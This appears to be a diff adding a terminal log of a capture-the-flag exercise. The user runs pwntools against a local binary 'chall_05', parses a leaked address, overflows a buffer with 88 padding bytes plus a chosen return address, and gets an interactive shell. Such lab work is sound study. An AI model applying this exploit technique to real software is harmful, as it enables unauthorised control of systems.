@@ -1,0 +1,28 @@
+┌──(kali㉿kali)-[~/pwns/chall_05]
+└─$ python    ------------------------------------------------------------------->  Command         
+Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from pwn import *  ------------------------------------------------------------------->  Command   
+>>> p = process('./chall_05')  ------------------------------------------------------------------->  Command   
+[x] Starting local process './chall_05'
+[+] Starting local process './chall_05': pid 77713
+>>> p.recv()  ------------------------------------------------------------------->  Command   
+b"Follow the compass and it'll probably lead you in the wrong direction\nI wonder what this is: 0x560c673331c0\n"
+>>> rec=_  ------------------------------------------------------------------->  Command   
+>>> a=rec.split(b": ")[1]  ------------------------------------------------------------------->  Command   
+>>> b=int(a,16)  ------------------------------------------------------------------->  Command   
+>>> b
+94611271004608
+>>> hex(b)   ------------------------------------------------------------------->  Command   
+'0x560c673331c0'
+>>> payload=88*b'A'  ------------------------------------------------------------------->  Command   
+>>> payload+=p64(94611271004585)  ------------------------------------------------------------------->  Command   
+>>> p.sendline(payload)  ------------------------------------------------------------------->  Command   
+>>> p.interactive()  ------------------------------------------------------------------->  Command   
+[*] Switching to interactive mode
+ls
+chall_05  core  e.py  exploit_05.py
+ls
+chall_05  core  e.py  exploit_05.py
+whoami
+kali
